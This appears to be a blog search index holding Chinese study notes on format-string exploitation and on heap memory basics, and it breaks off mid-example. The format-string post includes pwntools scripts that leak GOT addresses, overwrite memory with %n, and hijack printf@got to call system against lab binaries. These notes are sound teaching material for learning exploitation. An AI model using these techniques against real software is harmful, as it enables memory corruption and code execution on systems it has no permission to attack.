<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><p>parameter</p><ul><li><p>n$，获取格式化字符串中的指定参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">例如<br><span class="hljs-type">int</span> a=<span class="hljs-number">0x1111</span>,b=<span class="hljs-number">0x2222</span>,c=<span class="hljs-number">0x3333</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>,a,b,c)<br><span class="hljs-comment">//按理来说输出的是0x3333</span><br><span class="hljs-comment">//但我自己执行的时候输出的是$p，不知道什么原因</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>flag</p></li><li><p>field width</p><ul><li>输出的最小宽度</li></ul></li><li><p>precision</p><ul><li>输出的最大长度</li></ul></li><li><p>length，输出的长度</p><ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li><p>type</p><ul><li>d&#x2F;i，有符号整数</li><li>u，无符号整数</li><li>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li><strong>n</strong>，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733155009147.png" alt="格式"></p><h3 id="参数位置"><a href="#参数位置" class="headerlink" title="参数位置"></a>参数位置</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>参数全在栈上</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>前6个参数由寄存器存放，rdi存储格式化字符串的地址，也就是说从%6$p在栈上</p><p>rdi  rsi  rdx  r10  r8  r9</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fmtarg addr</span><br></code></pre></td></tr></table></figure><p>能直接看到地址相对于printf函数和格式化字符串地址的偏移</p><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Typora/保存的文件/格式化字符串/格式化字符串/1733327651168.png" alt="1733327651168"></p><p>(断点下在printf函数处)</p><h3 id="常见格式化字符串函数"><a href="#常见格式化字符串函数" class="headerlink" title="常见格式化字符串函数"></a>常见格式化字符串函数</h3><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733328075199.png" alt="常见函数"></p><h2 id="格式化字符串的利用"><a href="#格式化字符串的利用" class="headerlink" title="格式化字符串的利用"></a>格式化字符串的利用</h2><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>理论依据：格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取) </p><p>这里以32位举例说明</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760093914.png" alt="main"></p><p>运行查看结果</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760198590.png" alt="结果"></p><p>gdb调试，断点下在两个printf处，查看栈上信息</p><p>第一个printf处</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760238293.png" alt="gdb"></p><p>可以看到 栈中第一个变量（esp）为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们**输入的格式化字符串对应的地址 **</p><p>继续运行</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1733760387677.png" alt="gdb"></p><p> 程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出 。</p><p>但上述输出需要输入很多个%x%x，如果<strong>需要获取某个参数，可以直接 %n$x</strong> ，这个n就是栈上的参数相对于格式化字符串的偏移，例如上面图片的0xffffcd0c就是%3$x，当然也可以%p来获取地址</p><p><strong>需要快速获取位移的话就可以来利用利用原理篇的gdb</strong></p><h4 id="获取栈变量对于字符串"><a href="#获取栈变量对于字符串" class="headerlink" title="获取栈变量对于字符串"></a>获取栈变量对于字符串</h4><p>就是%s，将对应处的变量解析为字符串地址进行输出</p><p><strong>如果不能被解析为字符串变量，则程序会崩溃</strong></p><p>所以快速让程序崩溃的一个办法就是输入一大串%s%s….</p><h4 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a>小技巧总结</h4><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有<strong>零截断</strong>。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p> &#x3D;完全控制泄露<strong>某个指定地址的内存</strong> </p><p>方法：获取<strong>某个addr的内容</strong>：<code>addr%k$s</code>这里的k是该格式化字符相对函数调用的第k个参数</p><p>那么想办法确认k就好了</p><p><strong>方法：</strong></p><p>输入[tag]%p%p%p%p%p查看哪个%p跟tag一样（比如aaaa%p%p%p%p%p）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022426662.png" alt="结果"></p><p>0x41414141跟我输入的AAAA一样，是<strong>格式化字符串的第4个参数</strong>所以k&#x3D;4即可输出该地址上的内容</p><p><strong>应用：</strong></p><ol><li><p>获取真实地址  例如获取scanf</p><ul><li><p>获取scanf@got<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734022850762.png" alt="got表"><br>gdb也是输入got\n就可以了</p></li><li><p>然后就scanf@got%4$s就可以输出got真实地址了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got 意思是会先将scanf@got打印出来然后才是scanf真实地址所以要接收后4字节</span><br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ul></li></ol><p><strong>注意：</strong></p><p>并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[padding]</span><span class="hljs-selector-attr">[addr]</span><br></code></pre></td></tr></table></figure><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p> 修改栈上变量的值，甚至修改任意地址变量的内存 </p><p>方法：<code>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</code></p><p>以如下代码为例：(32)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">/* example/overflow/overflow.c */<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-built_in">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-built_in">int</span> main() &#123;<br>  <span class="hljs-built_in">int</span> c = <span class="hljs-number">789</span>;<br>  char s[<span class="hljs-number">100</span>];<br>  printf(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  printf(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    puts(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>基本payload格式：</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">...[overwrite addr]....%[overwrite <span class="hljs-built_in">offset</span>]$<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p> 其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数 </p><p><strong>一般步骤：</strong></p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>目的：进入第一个if语句</p><ol><li><p>地址：</p><p>上面程序有打印c的地址，直接用即可</p></li><li><p>偏移：</p><p>gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734091929291.png" alt="gdb"></p><p>发现是第6个参数，所以是%6$n</p></li><li><p>覆盖</p><p>payload如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></td></tr></table></figure><p>因为addr of c栈4字节，所以再补充12个字节即可将c覆盖成16</p></li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(sh)</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>问题：当我需要覆盖的数字小于4&#x2F;8时，会导致覆盖失败，因为addr of a就占了4字节</p><p>解决：没有必要一定将addr放在最前面，只要知道偏移即可</p><p>当我们将a覆盖为2时，格式必须是</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">aa<span class="hljs-built_in">%k</span><span class="hljs-built_in">$nxxxxx</span>(xxx是后面的内容)<br></code></pre></td></tr></table></figure><p>围绕这个展开</p><ol><li><p>确定地址<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734095378872.png" alt="IDA"></p></li><li><p>确定偏移<br>aa%k$n已经占了6字节，在覆盖栈内存时可知偏移为6，这里我们构造成aa%k$aa这样就占了8字节，刚好占2，所以将上面的偏移往后推2即可，可得出k为8</p></li><li><p>进行覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>a_addr = <span class="hljs-number">0x0804A024</span><br>payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure></li></ol><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p><strong>变量在内存中的存储格式：</strong></p><p> 首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。 </p><p>types：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">hh 对于整数类型，printf期待一个从<span class="hljs-type">char</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br>h  对于整数类型，printf期待一个从<span class="hljs-type">short</span>提升的<span class="hljs-type">int</span>尺寸的整型参数。<br></code></pre></td></tr></table></figure><p>所以可利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节</p><ol><li><p>确定覆盖的地址<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096669149.png" alt="IDA"></p><p>如何覆盖<br><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/1734096681348.png" alt="^^"></p></li><li><p>确定偏移<br>由覆盖栈内存可得出偏移是6</p><p>payload格式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0804A028)</span></span>+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A029)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02a)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x0804A02b)+pad1+<span class="hljs-string">&#x27;%6$hhn&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$hhn&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$hhn&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p> 在目前的 C 程序中，libc 中的函数都是通过<strong>GOT 表来跳转</strong>的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是<strong>可以被修改的</strong>  因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如<strong>说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</strong> </p><p>加入将函数A的地址覆盖为函数B的地址，有如下步骤：</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li><p>写入函数：write 函数。</p></li><li><p>ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pop eax; ret;           <span class="hljs-comment"># printf@got -&gt; eax</span><br>pop ebx; ret;           <span class="hljs-comment"># (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br>add [eax] ebx; ret;     <span class="hljs-comment"># [printf@got] = [printf@got] + addr_offset</span><br></code></pre></td></tr></table></figure></li><li><p>格式化字符串任意地址写</p></li></ul></li></ul></li><li><p>payload &#x3D; fmtstr_payload(offset,{printf_got:system_plt}) 用来将地址替换掉，这里是将printf_got替换成为system_plt，offset是格式化字符串的偏移</p><p>这个是专门为<strong>32位</strong>程序格式化字符串漏洞输出payload的一个函数</p></li></ul><h3 id="hijack-retadder"><a href="#hijack-retadder" class="headerlink" title="hijack retadder"></a>hijack retadder</h3><p>利用格式化字符串来控制程序的返回地址（可能是用在开了RELRO，无法修改got的情况？）</p><p>思路：</p><p> 存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算</p><ul><li>确定偏移</li><li>获取函数的 rbp 与返回地址</li><li>根据相对偏移获取存储返回地址的地址</li><li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2025/01/28/%E5%A0%86/"/>
    <url>/2025/01/28/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="堆简介"><a href="#堆简介" class="headerlink" title="堆简介"></a>堆简介</h2><p> 提供<strong>动态分配</strong>的内存      </p><p> 堆其实就是程序虚拟地址空间的一块<strong>连续</strong>的线性区域，它由<strong>低地址向高地址方向增长</strong>（栈是高地址向低地址）。我们一般称管理堆的那部分程序为堆管理器。 </p><p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>  所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户<strong>使用到</strong>相应的内存时，系统才会真正分配物理页面给用户使用。 </p><h2 id="堆基本操作"><a href="#堆基本操作" class="headerlink" title="堆基本操作"></a>堆基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>原型：<code>void *malloc(size_t size);</code></p><p>对异常状况的处理：</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p> free(void* p) </p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间<strong>还给系统</strong>，以便于减小程序所使用的内存空间。</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>无论是maclloc还是free都<strong>不是</strong>直接与系统交互的函数，这些函数背后的调用主要是(s)brk函数和mmap,munmap函数</p><p>当使用内存块申请操作时</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/735202994948.png" alt="系统调用"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加brk 的大小来向操作系统申请内存。 </p><p>初始时，堆的起始地址start_brk以及堆的当前末尾 brk指向<strong>同一地址</strong>。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向<strong>data&#x2F;bss 段的结尾</strong>。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的<strong>随机偏移处</strong>。</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/735203153769.png" alt="结构"></p><p>brk和sbrk</p><p><code>sbrk</code>和<code>brk</code>是UNIX和类UNIX操作系统中用于管理进程数据段（堆）的两个系统调用。它们都用于改变进程的堆大小，但它们的使用方式和行为有所不同。</p><h5 id="sbrk函数"><a href="#sbrk函数" class="headerlink" title="sbrk函数"></a><code>sbrk</code>函数</h5><p><code>sbrk</code>函数用于申请或释放堆内存。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>increment</code>：指定堆应该增加或减少的字节数。正值表示增加堆的大小，负值表示减少堆的大小。</li><li>返回值：<code>sbrk</code>返回新的堆顶地址。</li></ul><p><code>sbrk</code>的工作方式是将堆顶（program break）向上或向下移动指定的字节数。如果<code>increment</code>是正数，堆增长；如果是负数，堆缩小。<code>sbrk</code>的返回值是操作前的堆顶地址。</p><h5 id="brk函数"><a href="#brk函数" class="headerlink" title="brk函数"></a><code>brk</code>函数</h5><p><code>brk</code>函数用于设置堆的上限。它的原型是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *end_data_segment)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>end_data_segment</code>：指定新的堆顶地址。</li><li>返回值：<code>brk</code>返回0表示成功，或者在出错时返回-1。</li></ul><p><code>brk</code>将堆顶设置为指定的地址。如果新的堆顶低于当前堆中已分配的内存（即堆缩小），<code>brk</code>可能会失败并返回-1。如果新的堆顶高于当前堆的大小（即堆增长），操作系统可能会分配更多的内存。</p><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ol><li><p><strong>操作方式</strong>：</p><ul><li><code>sbrk</code>通过指定要增加或减少的字节数来改变堆的大小。</li><li><code>brk</code>直接设置堆的新上限地址。</li></ul></li><li><p><strong>返回值</strong>：</p><ul><li><code>sbrk</code>返回操作前的堆顶地址。</li><li><code>brk</code>返回0表示成功，返回-1表示失败。</li></ul></li><li><p><strong>行为</strong>：</p><ul><li><code>sbrk</code>在增加堆时，如果新的堆顶超过了系统为进程分配的最大堆大小，<code>sbrk</code>会失败。</li><li><code>brk</code>在设置堆顶时，如果新的堆顶低于已分配的内存，<code>brk</code>会失败。</li></ul></li></ol><p>在现代操作系统中，<code>malloc</code>和<code>free</code>等高级内存管理函数通常是基于<code>sbrk</code>和<code>brk</code>实现的，但在大多数情况下，程序员不需要直接使用<code>sbrk</code>和<code>brk</code>，而是使用这些更高级的抽象。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sbrk and brk example */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">void</span> *curr_brk, *tmp_brk = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());<br><br>        <span class="hljs-comment">/* sbrk(0) gives current program break location */</span><br>        tmp_brk = curr_brk = sbrk(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//这里使这两个变量都是堆的初始地址，这里还没有出现堆</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        <span class="hljs-comment">/* brk(addr) increments/decrements program break location */</span><br>        brk(curr_brk+<span class="hljs-number">4096</span>);<br><span class="hljs-comment">//开始出现堆，大小位4kb</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<span class="hljs-comment">//sbrk本质是向上或向下控制堆的大小并返回结果地址，这里传参数0就是不对堆做任何的大小上的改变，返回的地址也就是此时堆顶部的地址了</span><br><span class="hljs-comment">//这里获取此时堆顶部的地址</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);<br>        getchar();<br><br>        brk(tmp_brk);<br><span class="hljs-comment">//释放堆</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);<br>        